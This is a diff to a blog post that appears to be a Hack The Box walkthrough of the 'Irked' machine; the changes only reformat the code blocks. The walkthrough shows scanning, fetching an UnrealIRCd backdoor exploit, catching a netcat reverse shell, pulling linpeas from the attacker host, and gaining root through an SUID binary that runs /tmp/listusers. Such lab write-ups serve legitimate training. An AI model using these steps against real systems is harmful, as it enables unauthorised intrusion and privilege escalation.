@@ -27,8 +27,7 @@ Not going to lie, got a little irked with this box.
 
 Run nmap and get a list of the ports.
 
-{% raw %}
-```sh
+{% capture nmap %}
 ┌──(kali㉿kali)-[~]
 └─$ sudo nmap -sC -sV -A -O -oN nmap 10.10.10.117            
 [sudo] password for kali: 
@@ -71,14 +70,13 @@ HOP RTT      ADDRESS
 
 OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 Nmap done: 1 IP address (1 host up) scanned in 9.77 seconds
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=nmap %}
 
 <br />
 Run nmap against all of the ports looking for any services running on any non-standard ports.
 
-{% raw %}
-```sh
+{% capture nmapfull %}
 ┌──(kali㉿kali)-[~]
 └─$ sudo nmap -sS -p- -oN nmapfull 10.10.10.117
 [sudo] password for kali: 
@@ -96,14 +94,13 @@ PORT      STATE SERVICE
 65534/tcp open  unknown
 
 Nmap done: 1 IP address (1 host up) scanned in 9.48 seconds
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=nmapfull %}
 
 <br />
 Banner grab for the newly exposed service to see if we can try and finger-print them and identify the service.
 
-{% raw %}
-```sh
+{% capture nmapspec %}
 ┌──(kali㉿kali)-[~]
 └─$  sudo nmap -sC -sV -p 6697,8067 10.10.10.117
 Starting Nmap 7.95 ( https://nmap.org ) at 2025-01-27 12:03 AEDT
@@ -117,8 +114,8 @@ Service Info: Host: irked.htb
 
 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 Nmap done: 1 IP address (1 host up) scanned in 8.03 seconds
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=nmapspec %}
 
 <br />
 Google the UnrealIRC to try and find an exploit.
@@ -132,8 +129,7 @@ Google the UnrealIRC to try and find an exploit.
 <br />
 Download the exploit.
 
-{% raw %}
-```sh
+{% capture downloadexploit %}
 ┌──(kali㉿kali)-[~/Documents/htb/irked]
 └─$ wget https://raw.githubusercontent.com/Ranger11Danger/UnrealIRCd-3.2.8.1-Backdoor/refs/heads/master/exploit.py
 --2025-01-27 12:15:20--  https://raw.githubusercontent.com/Ranger11Danger/UnrealIRCd-3.2.8.1-Backdoor/refs/heads/master/exploit.py
@@ -146,16 +142,18 @@ Saving to: ‘exploit.py’
 exploit.py                                                 100%[========================================================================================================================================>]   2.14K  --.-KB/s    in 0s      
 
 2025-01-27 12:15:20 (48.6 MB/s) - ‘exploit.py’ saved [2195/2195]
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=downloadexploit %}
 
 <br />
 Update the python script with the proper LHOST and LPORT.
 
-{% raw %}
-```sh
+{% capture catexploit %}
 ┌──(kali㉿kali)-[~/Documents/htb/irked]
-└─$ cat exploit.py        
+└─$ cat exploit.py 
+{% endcapture %}
+
+{% capture exploit %}
 #!/usr/bin/python3
 import argparse
 import socket
@@ -173,36 +171,36 @@ local_ip = '10.10.16.12'  # CHANGE THIS
 local_port = '443'  # CHANGE THIS 
 
 <snip>
-```
-{% endraw %}
+{% endcapture %}
+
+{% include terminal.html language='bash' title='bash' content=catexploit %}
+
+{% include terminal.html language='python' title='exploit.py' content=exploit %}
 
 <br />
 Start a netcat listener.
 
-{% raw %}
-```sh
+{% capture startlistener %}
 ┌──(kali㉿kali)-[~/Documents/htb/irked]
 └─$ sudo nc -nlvp 443                            
 [sudo] password for kali: 
 listening on [any] 443 ...
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=startlistener %}
 
 <br />
 Run the exploit and chose to use the netcat payload.
 
-{% raw %}
-```sh
+{% capture runexploit %}
 ┌──(kali㉿kali)-[~/Documents/htb/irked]
 └─$ python exploit.py -payload netcat 10.10.10.117 6697
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=runexploit %}
 
 <br />
 Check the listener and catch the shell.
 
-{% raw %}
-```sh
+{% capture catchshell %}
 ┌──(kali㉿kali)-[~/Documents/htb/irked]
 └─$ sudo nc -nlvp 443                            
 [sudo] password for kali: 
@@ -212,14 +210,13 @@ whoami
 ircd
 python3 -c 'import pty; pty.spawn("/bin/bash");'
 ircd@irked:~/Unreal3.2$
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=catchshell %}
 
 <br />
 Download the linpeas.sh to the attack machine.
 
-{% raw %}
-```sh
+{% capture downloadpeas %}
 ┌──(kali㉿kali)-[~/Documents/htb/irked]
 └─$ wget https://github.com/peass-ng/PEASS-ng/releases/download/20250126-41ed0f6a/linpeas.sh                  
 --2025-01-27 13:00:32--  https://github.com/peass-ng/PEASS-ng/releases/download/20250126-41ed0f6a/linpeas.sh
@@ -237,25 +234,23 @@ Saving to: ‘linpeas.sh’
 linpeas.sh                                                 100%[========================================================================================================================================>] 820.08K  2.77MB/s    in 0.3s    
 
 2025-01-27 13:00:34 (2.77 MB/s) - ‘linpeas.sh’ saved [839766/839766]
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=downloadpeas %}
 
 <br />
 Start a webserver to serve the exploit.
 
-{% raw %}
-```sh
+{% capture pyserver %}
 ┌──(kali㉿kali)-[~/Documents/htb/irked]
 └─$ python -m 'http.server'
 Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=pyserver %}
 
 <br />
 Transfer the linpeas.sh to the victim machine.
 
-{% raw %}
-```sh
+{% capture transferpeas %}
 ircd@irked:~$ wget http://10.10.16.12:8000/linpeas.sh
 wget http://10.10.16.12:8000/linpeas.sh
 --2025-01-26 21:00:59--  http://10.10.16.12:8000/linpeas.sh
@@ -270,14 +265,13 @@ linpeas.sh          100%[=====================>] 820.08K  1.04MB/s   in 0.8s
 
 ircd@irked:~$ chmod +x linpeas.sh
 chmod +x linpeas.sh
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=transferpeas %}
 
 <br />
 Run linpeas.sh and notice the /usr/bin/viewuser (Unknown SUID binary!) in the results.  Looks interesting.
 
-{% raw %}
-```sh
+{% capture runpeas %}
 ircd@irked:~$ ./linpeas.sh
 ./linpeas.sh
 
@@ -308,28 +302,26 @@ ircd@irked:~$ ./linpeas.sh
 
 <snip>
 
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=runpeas %}
 
 <br />
 Try to give it a run just to see what it does.
 
-{% raw %}
-```sh
+{% capture testrun %}
 ircd@irked:/dev/shm$ /usr/bin/viewuser --help
 /usr/bin/viewuser --help
 This application is being devleoped to set and test user permissions
 It is still being actively developed
 (unknown) :0           2025-02-02 00:51 (:0)
 sh: 1: /tmp/listusers: not found
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=testrun %}
 
 <br />
 Create a /tmp/listusers file with the ircd user to see what happens.
 
-{% raw %}
-```sh
+{% capture usertest %}
 ircd@irked:/dev/shm$ echo ircd > /tmp/listusers
 echo ircd > /tmp/listusers
 ircd@irked:/dev/shm$ /usr/bin/viewuser
@@ -346,14 +338,13 @@ This application is being devleoped to set and test user permissions
 It is still being actively developed
 (unknown) :0           2025-02-02 00:51 (:0)
 /tmp/listusers: 1: /tmp/listusers: ircd: not found
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=usertest %}
 
 <br />
 Judging by the sh from the first run and the user not from the second run, it could be looking for some kind of bash script.  Try injecting /bin/bash into the /tmp/listusers file.
 
-{% raw %}
-```sh
+{% capture echobash %}
 ircd@irked:/dev/shm$ echo '/bin/bash' > /tmp/listusers
 echo '/bin/bash' > /tmp/listusers
 ircd@irked:/dev/shm$ /usr/bin/viewuser
@@ -364,14 +355,13 @@ It is still being actively developed
 root@irked:/dev/shm# whoami
 whoami
 root
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=echobash %}
 
 <br />
 Get the root.txt file.
 
-{% raw %}
-```sh
+{% capture rootflag %}
 root@irked:/dev/shm# cat /root/root.txt
 cat /root/root.txt
 <redacted>
@@ -391,14 +381,13 @@ ip a
        valid_lft 86396sec preferred_lft 14396sec
     inet6 fe80::250:56ff:feb9:5d1c/64 scope link 
        valid_lft forever preferred_lft forever
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=rootflag %}
 
 <br />
 Get the user.txt file.
 
-{% raw %}
-```sh
+{% capture userflag %}
 root@irked:/home/djmardov# cat user.txt
 cat user.txt
 <redacted>
@@ -418,8 +407,8 @@ ip a
        valid_lft 86400sec preferred_lft 14400sec
     inet6 fe80::250:56ff:feb9:5d1c/64 scope link 
        valid_lft forever preferred_lft forever
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=userflag %}
 
 <br />
 And with that we wrapped up another one.  Hopefully it didn't irk you as much as it did for me.
